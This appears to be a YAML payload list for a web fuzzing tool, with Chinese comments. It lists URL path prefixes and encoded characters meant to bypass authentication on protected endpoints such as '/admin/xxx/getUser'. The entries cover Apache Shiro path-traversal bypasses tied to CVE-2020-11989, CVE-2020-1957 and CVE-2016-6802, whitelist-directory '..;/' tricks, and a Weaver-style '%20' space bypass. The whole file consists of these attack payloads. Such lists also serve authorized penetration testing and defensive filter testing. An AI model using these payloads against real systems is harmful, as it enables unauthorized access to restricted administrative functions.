# 下一步计划，根据网站url路径，自动生成fuzz payload
prefix: #/{{FUZZ}}admin/xxx/getUser
    - "\\/"
    - "/"
    - ";/"  #CVE-2020-11989
    - "..;/"
    #白名单 + CVE-2020-1957，/demo/..;/admin/index其中demo为白名单路径，admin/index为鉴权路径
    - "images/..;/"
    - "images;/../"
    - "js/..;/"
    - "js;/../"
    - "pages/..;/"
    - "pages;/../"
    - "api/..;/"
    - "api;/../"
    - "user/..;/"
    - "user;/../"
    - "open/..;/"
    - "open;/../"
    - "error;/../"
    - "error;/../"
    - "public/..;/"
    - "public;/../"
    - "static/..;/"
    - "static;/../"
    - "css/..;/"
    - "css;/../"
    - "resource/..;/"
    - "resource;/../"
    #白名单 + CVE-2016-6802，在访问路径前加上/任意目录名/../，即可绕过访问
    - "images/../"
    - "js/../"
    - "page/../"
    - "api/../"
    - "user/../"
    - "open/../"
    - "public/../"
    - "static/../"
    - "css/../"
    - "resource/../"
    #else
    - "%2e/"
    - ";/"
    - "./"
    - "%20/"
    - "%09/"
    - ".;/"
    - "..%00/"
    - "..%0d/"
    - "..%5c/"
    - "#/../"
#仿照weaver的空格绕过，增加前缀 /services%20/WorkflowServiceXml
    # UTF-8 编码
    - "%00"    # 空字符 (NUL)
    - "%20"    # 空格，类似weaver
    - "%09"    # 制表符 (TAB)
    - "%0A"    # 换行符 (LF)
    - "%0D"    # 回车符 (CR)
    - "%0B"    # 垂直制表符 (VT)
    - "%0C"    # 换页符 (FF)
    - "%A0"    # 不间断空格 (NBSP)
    - "%FE%FF" # UTF-8 BOM (Byte Order Mark)

    # UTF-16 编码
    - "%FF%FE%00"    # 空字符 (NUL)
    - "%FF%FE%20"    # 空格
    - "%FF%FE%09"    # 制表符 (TAB)
    - "%FF%FE%0A"    # 换行符 (LF)
    - "%FF%FE%0D"    # 回车符 (CR)
    - "%FF%FE%0B"    # 垂直制表符 (VT)
    - "%FF%FE%0C"    # 换页符 (FF)
    - "%FF%FE%A0"    # 不间断空格 (NBSP)
    - "%FF%FE%EF%BB%BF" # UTF-16 BOM (Byte Order Mark)

#根据/services%20/WorkflowServiceXml泛微的payload，给非末尾路径的后面也添加fuzz，主要是添加各种url编码的空字符串
middle_suffix:
    # UTF-8 编码
    - "%00"    # 空字符 (NUL)
    - "%20"    # 空格
    - "%09"    # 制表符 (TAB)
    - "%0A"    # 换行符 (LF)
    - "%0D"    # 回车符 (CR)
    - "%0B"    # 垂直制表符 (VT)
    - "%0C"    # 换页符 (FF)
    - "%A0"    # 不间断空格 (NBSP)
    - "%FE%FF" # UTF-8 BOM (Byte Order Mark)

    # UTF-16 编码
    - "%FF%FE%00"    # 空字符 (NUL)
    - "%FF%FE%20"    # 空格
    - "%FF%FE%09"    # 制表符 (TAB)
    - "%FF%FE%0A"    # 换行符 (LF)
    - "%FF%FE%0D"    # 回车符 (CR)
    - "%FF%FE%0B"    # 垂直制表符 (VT)
    - "%FF%FE%0C"    # 换页符 (FF)
    - "%FF%FE%A0"    # 不间断空格 (NBSP)
    - "%FF%FE%EF%BB%BF" # UTF-16 BOM (Byte Order Mark)


